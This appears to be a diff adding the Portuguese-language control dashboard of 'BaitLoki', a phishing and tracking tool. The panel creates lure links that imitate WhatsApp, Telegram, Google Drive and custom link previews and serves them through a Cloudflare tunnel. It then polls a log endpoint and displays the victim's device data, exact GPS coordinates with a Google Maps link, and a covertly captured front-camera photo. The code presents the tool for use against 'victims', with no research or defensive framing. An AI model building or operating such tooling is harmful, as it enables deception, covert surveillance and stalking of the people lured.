@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BaitLoki - C2 Dashboard</title>
+    
+    <!-- Ícones e Fontes -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto+Mono:wght@400;500&family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --bg-dark: #0a0a0a; 
+            --bg-panel: #141414; 
+            --accent: #ff8800; /* Laranja Cloudflare */
+            --success: #00ff41; 
+            --danger: #ff003c; 
+            --text-main: #e0e0e0; 
+            --maps-blue: #4285F4;
+        }
+
+        body {
+            background-color: var(--bg-dark); 
+            color: var(--text-main); 
+            font-family: 'Roboto', sans-serif;
+            margin: 0; 
+            padding: 20px; 
+            background-image: radial-gradient(circle at 50% 10%, #1a1a1a 0%, #000000 100%);
+        }
+
+        .container { max-width: 900px; margin: 0 auto; padding-bottom: 50px; }
+        header { text-align: center; margin-bottom: 30px; }
+        .logo-img { height: 100px; border-radius: 10px; border: 1px solid #333; box-shadow: 0 0 15px rgba(255, 136, 0, 0.2); }
+        h1 { font-family: 'Orbitron', sans-serif; color: var(--accent); margin: 10px 0; letter-spacing: 2px; }
+
+        /* SELEÇÃO DE APP */
+        .grid-apps { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; margin-bottom: 20px; }
+        .card { background: var(--bg-panel); border: 1px solid #333; padding: 15px; border-radius: 8px; text-align: center; cursor: pointer; transition: 0.3s; }
+        .card:hover { transform: translateY(-3px); border-color: var(--accent); }
+        .card i { font-size: 2rem; margin-bottom: 10px; display:block; }
+        .card h3 { font-size: 0.9rem; margin: 0; }
+
+        /* CONFIGURAÇÃO */
+        .config-panel { display: none; background: var(--bg-panel); padding: 25px; border-radius: 10px; border-left: 4px solid var(--accent); margin-bottom: 20px; animation: slideDown 0.3s ease; }
+        @keyframes slideDown { from {opacity: 0; transform: translateY(-20px);} to {opacity: 1; transform: translateY(0);} }
+
+        .input-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; color: var(--accent); font-size: 0.8rem; text-transform: uppercase; }
+        input, textarea { width: 96%; padding: 12px; background: #000; border: 1px solid #333; color: #fff; border-radius: 4px; font-family: 'Roboto Mono', monospace; }
+        .extra-fields { display: none; margin-top: 15px; border-top: 1px dashed #333; padding-top: 15px; }
+        .row { display: flex; gap: 15px; } .col { flex: 1; }
+
+        .btn-generate { width: 100%; padding: 15px; border: none; border-radius: 5px; background: #333; color: #777; font-weight: bold; font-size: 1rem; cursor: not-allowed; transition: 0.3s; text-transform: uppercase; margin-top: 10px; }
+        .btn-generate.active { background: var(--success); color: #000; cursor: pointer; box-shadow: 0 0 15px rgba(0, 255, 65, 0.3); }
+
+        /* STATUS */
+        .status-container { display: none; margin-top: 25px; background: #1a1a1a; padding: 20px; border-radius: 10px; border: 1px solid #333; }
+        .progress-wrapper { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
+        .progress-bar-bg { flex-grow: 1; height: 20px; background: #000; border-radius: 10px; overflow: hidden; position: relative; border: 1px solid #333; }
+        .progress-bar-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--accent), var(--success)); transition: width 0.5s ease; box-shadow: 0 0 10px var(--accent); }
+        .progress-text { position: absolute; width: 100%; text-align: center; line-height: 20px; font-size: 0.75rem; color: #fff; font-weight: bold; text-shadow: 1px 1px 2px #000; }
+        .btn-stop { background: var(--danger); color: #fff; border: none; padding: 0 20px; height: 40px; border-radius: 5px; cursor: pointer; font-weight: bold; display: flex; align-items: center; gap: 5px; transition: 0.2s; }
+
+        /* LINK */
+        .link-area { margin-top: 15px; padding: 15px; background: #000; border-radius: 5px; border: 1px solid #333; }
+        .link-input-group { display: flex; gap: 10px; }
+        .link-input { background: #0f0f0f; color: var(--success); font-weight: bold; border: 1px solid #333; width: 100%; padding: 10px; }
+        .btn-copy { background: var(--accent); border: none; color: #000; padding: 0 20px; font-weight: bold; cursor: pointer; border-radius: 4px; }
+
+        /* RESULTADOS */
+        .results-container { display: none; margin-top: 25px; animation: fadeIn 0.5s; }
+        .result-card { background: #111; border: 1px solid #333; border-radius: 8px; padding: 20px; margin-bottom: 20px; }
+        .result-title { color: var(--accent); font-family: 'Orbitron'; margin-bottom: 15px; border-bottom: 1px solid #333; padding-bottom: 5px; }
+        .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
+        .info-item { background: #0a0a0a; padding: 10px; border-radius: 5px; border-left: 2px solid #333; }
+        .info-label { color: #777; font-size: 0.75rem; display: block; }
+        .info-val { color: #fff; font-family: 'Roboto Mono'; font-size: 0.9rem; }
+        
+        .btn-maps { display: none; width: 100%; background: var(--maps-blue); color: #fff; text-decoration: none; padding: 15px; text-align: center; border-radius: 5px; font-weight: bold; margin-top: 15px; text-transform: uppercase; letter-spacing: 1px; transition: 0.3s; }
+        .btn-maps:hover { background: #3367d6; box-shadow: 0 0 15px rgba(66, 133, 244, 0.4); }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <header>
+        <img src="logo_loki.jpg" class="logo-img">
+        <h1>BAITLOKI <span style="font-size:0.5em; color:#777;">CLOUD</span></h1>
+    </header>
+
+    <div class="grid-apps" id="appGrid">
+        <div class="card" onclick="selectApp(1, 'Near You', '#667eea')">
+            <i class="fas fa-map-marked-alt" style="color: #667eea;"></i><h3>Near You</h3>
+        </div>
+        <div class="card" onclick="selectApp(2, 'WhatsApp', '#25D366')">
+            <i class="fab fa-whatsapp" style="color: #25D366;"></i><h3>WhatsApp</h3>
+        </div>
+        <div class="card" onclick="selectApp(3, 'Telegram', '#0088cc')">
+            <i class="fab fa-telegram" style="color: #0088cc;"></i><h3>Telegram</h3>
+        </div>
+        <div class="card" onclick="selectApp(4, 'Google Drive', '#1FA463')">
+            <i class="fab fa-google-drive" style="color: #1FA463;"></i><h3>Google Drive</h3>
+        </div>
+        <div class="card" onclick="selectApp(5, 'Link Personalizado', '#FF5733')">
+            <i class="fas fa-link" style="color: #FF5733;"></i><h3>Custom Link</h3>
+        </div>
+    </div>
+
+    <div id="configPanel" class="config-panel">
+        <h2 id="configTitle" style="margin-top:0; color:#fff; font-size:1.2rem;"><i class="fas fa-cogs"></i> CONFIGURAR</h2>
+        
+        <div class="input-group">
+            <label id="lblTitle">TÍTULO</label>
+            <input type="text" id="groupName" placeholder="Ex: Arquivos Secretos" onkeyup="checkInputs()">
+        </div>
+        <div class="input-group">
+            <label>IMAGEM (OPCIONAL)</label>
+            <input type="text" id="groupImage" placeholder="URL da imagem..." onkeyup="checkInputs()">
+        </div>
+        
+        <!-- CAMPO DE REDIRECIONAMENTO (CUSTOM OG) -->
+        <div id="redirectField" class="input-group" style="display:none;">
+            <label>URL DE DESTINO (REDIRECIONAMENTO)</label>
+            <input type="text" id="redirectUrl" placeholder="Ex: https://youtube.com/watch?v=..." onkeyup="checkInputs()">
+        </div>
+
+        <div id="telegramFields" class="extra-fields">
+            <div class="input-group">
+                <label>DESCRIÇÃO</label>
+                <textarea id="groupDesc" placeholder="Descrição..."></textarea>
+            </div>
+            <div class="row">
+                <div class="col input-group"><label>MEMBROS</label><input type="text" id="groupMem" placeholder="Ex: 45k"></div>
+                <div class="col input-group"><label>ONLINE</label><input type="text" id="groupOnline" placeholder="Ex: 1.2k"></div>
+            </div>
+        </div>
+
+        <button id="btnGenerate" class="btn-generate" onclick="startServer()">
+            <i class="fas fa-bolt"></i> INICIAR TÚNEL
+        </button>
+    </div>
+
+    <!-- STATUS & RESULTADOS -->
+    <div id="statusContainer" class="status-container">
+        <div class="progress-wrapper">
+            <div class="progress-bar-bg">
+                <div id="progressBar" class="progress-bar-fill"></div>
+                <div id="progressText" class="progress-text">Inicializando...</div>
+            </div>
+            <button class="btn-stop" onclick="stopServer()"><i class="fas fa-stop"></i> PARAR</button>
+        </div>
+        <div id="linkArea" class="link-area">
+            <label style="color:#888; margin-bottom:5px;">SEU LINK SEGURO (Cloudflare):</label>
+            <div class="link-input-group">
+                <input type="text" id="attackLink" class="link-input" placeholder="Gerando link..." readonly>
+                <button class="btn-copy" onclick="copyLink()"><i class="fas fa-copy"></i></button>
+            </div>
+        </div>
+    </div>
+
+    <div id="resultsContainer" class="results-container">
+        
+        <!-- CARD FOTO CAPTURADA (CAMTRAP) -->
+        <div class="result-card" id="camCard" style="display:none; border-color: var(--danger);">
+            <div class="result-title" style="color: var(--danger);"><i class="fas fa-camera"></i> ALVO CAPTURADO</div>
+            <div style="text-align:center; padding: 10px;">
+                <img id="camImage" src="" style="max-width:100%; border-radius:8px; border:2px solid #555; box-shadow: 0 0 15px rgba(255, 0, 0, 0.2);">
+                <p style="color:#777; font-size:0.8rem; margin-top:5px; font-family:'Roboto Mono';">CÂMERA FRONTAL</p>
+            </div>
+        </div>
+
+        <!-- CARD DISPOSITIVO -->
+        <div class="result-card">
+            <div class="result-title"><i class="fas fa-mobile-alt"></i> DISPOSITIVO</div>
+            <div class="info-grid" id="deviceGrid"><div style="color:#666;">Aguardando...</div></div>
+        </div>
+
+        <!-- CARD LOCALIZAÇÃO -->
+        <div class="result-card">
+            <div class="result-title"><i class="fas fa-map-marker-alt"></i> LOCALIZAÇÃO</div>
+            <div class="info-grid" id="locationGrid">
+                <div class="info-item"><span class="info-label">LAT</span><span class="info-val" id="valLat">--</span></div>
+                <div class="info-item"><span class="info-label">LON</span><span class="info-val" id="valLon">--</span></div>
+                <div class="info-item"><span class="info-label">PRECISÃO</span><span class="info-val" id="valAcc">--</span></div>
+            </div>
+            <a id="mapsLink" href="#" target="_blank" class="btn-maps"><i class="fas fa-map-marked-alt"></i> ABRIR NO GOOGLE MAPS</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    let selectedTemplate = null;
+    let checkInterval;
+
+    function selectApp(id, name, color) {
+        selectedTemplate = id;
+        const panel = document.getElementById('configPanel');
+        panel.style.display = 'block';
+        panel.style.borderLeftColor = color;
+        
+        // Logica de campos dinâmicos
+        const tgFields = document.getElementById('telegramFields');
+        const redirField = document.getElementById('redirectField');
+        const lblTitle = document.getElementById('lblTitle');
+        
+        tgFields.style.display = 'none';
+        redirField.style.display = 'none';
+        lblTitle.innerText = "TÍTULO";
+        
+        if (id === 3) tgFields.style.display = 'block';
+        if (id === 4) lblTitle.innerText = "NOME DO ARQUIVO"; // GDrive
+        if (id === 5) {
+            redirField.style.display = 'block'; // Custom Link
+            lblTitle.innerText = "TÍTULO DO LINK (PREVIEW)";
+        }
+
+        panel.scrollIntoView({behavior: 'smooth'});
+        resetUI();
+    }
+
+    function resetUI() {
+        document.getElementById('statusContainer').style.display = 'none';
+        document.getElementById('resultsContainer').style.display = 'none';
+        document.getElementById('camCard').style.display = 'none'; // Reseta Card Foto
+        document.getElementById('btnGenerate').disabled = true; 
+        document.getElementById('btnGenerate').classList.remove('active');
+        document.getElementById('mapsLink').style.display = 'none';
+        checkInputs();
+    }
+
+    function checkInputs() {
+        const name = document.getElementById('groupName').value;
+        const redir = document.getElementById('redirectUrl').value;
+        const btn = document.getElementById('btnGenerate');
+        
+        let isValid = (name.length > 0);
+        if(selectedTemplate === 5 && redir.length < 5) isValid = false;
+        
+        if(isValid) {
+            btn.classList.add('active');
+            btn.disabled = false;
+        } else {
+            btn.classList.remove('active');
+            btn.disabled = true;
+        }
+    }
+
+    function updateProgress(percent, text) {
+        document.getElementById('progressBar').style.width = percent + '%';
+        document.getElementById('progressText').innerText = text;
+    }
+    
+    function startServer() {
+        document.getElementById('configPanel').style.display = 'none';
+        document.getElementById('statusContainer').style.display = 'block';
+        updateProgress(20, "Iniciando Python & Cloudflare...");
+
+        const formData = new URLSearchParams();
+        formData.append('action', 'start');
+        formData.append('template', selectedTemplate);
+        formData.append('title', document.getElementById('groupName').value);
+        formData.append('image', document.getElementById('groupImage').value);
+        formData.append('desc', document.getElementById('groupDesc').value);
+        formData.append('redirect_url', document.getElementById('redirectUrl').value);
+        formData.append('mem_num', document.getElementById('groupMem').value);
+        formData.append('online_num', document.getElementById('groupOnline').value);
+
+        fetch('controlador.php', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: formData.toString() })
+        .then(r => r.json())
+        .then(data => {
+            if(data.status === 'started') {
+                updateProgress(60, "Procurando Túnel...");
+                const linkInput = document.getElementById('attackLink');
+                if(data.public_url) {
+                    linkInput.value = data.public_url;
+                    updateProgress(50, "Aguardando Vítima..."); 
+                } else {
+                    linkInput.value = "Link não encontrado (cf.log)";
+                    updateProgress(0, "Erro");
+                }
+                if(checkInterval) clearInterval(checkInterval);
+                checkInterval = setInterval(pollLogs, 2000);
+            }
+        });
+    }
+
+    function stopServer() {
+        fetch('controlador.php', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'action=stop' })
+        .then(() => location.reload());
+    }
+
+    function pollLogs() {
+        fetch('leitor_logs.php')
+        .then(r => r.json())
+        .then(data => {
+            if(data.has_data) {
+                document.getElementById('resultsContainer').style.display = 'block';
+                
+                // 1. Dados do Dispositivo
+                if(data.device) {
+                    updateProgress(80, "Dados Recebidos!");
+                    let html = '';
+                    for (const [key, value] of Object.entries(data.device)) {
+                        html += `<div class="info-item"><span class="info-label">${key.toUpperCase()}</span><span class="info-val">${value}</span></div>`;
+                    }
+                    document.getElementById('deviceGrid').innerHTML = html;
+                }
+                
+                // 2. Localização GPS
+                if(data.location) {
+                    updateProgress(90, "Localização Exata!");
+                    document.getElementById('valLat').innerText = data.location.lat;
+                    document.getElementById('valLon').innerText = data.location.lon;
+                    document.getElementById('valAcc').innerText = data.location.acc + 'm';
+                    const mapsUrl = `https://www.google.com/maps/place/${data.location.lat},${data.location.lon}`;
+                    const btnMaps = document.getElementById('mapsLink');
+                    btnMaps.href = mapsUrl;
+                    btnMaps.style.display = 'block';
+                }
+
+                // 3. FOTO (CAMTRAP) - NOVO!
+                if(data.image) {
+                    updateProgress(100, "FOTO CAPTURADA!");
+                    document.getElementById('camCard').style.display = 'block';
+                    // Adiciona timestamp para forçar atualização da imagem (evita cache)
+                    document.getElementById('camImage').src = data.image + '?t=' + new Date().getTime();
+                    
+                    // Se pegou a foto, podemos parar de consultar tão rápido (opcional)
+                    // clearInterval(checkInterval); 
+                }
+            }
+        });
+    }
+
+    function copyLink() {
+        const copyText = document.getElementById("attackLink");
+        copyText.select();
+        document.execCommand("copy");
+        alert("Link copiado!");
+    }
+</script>
+</body>
+</html>
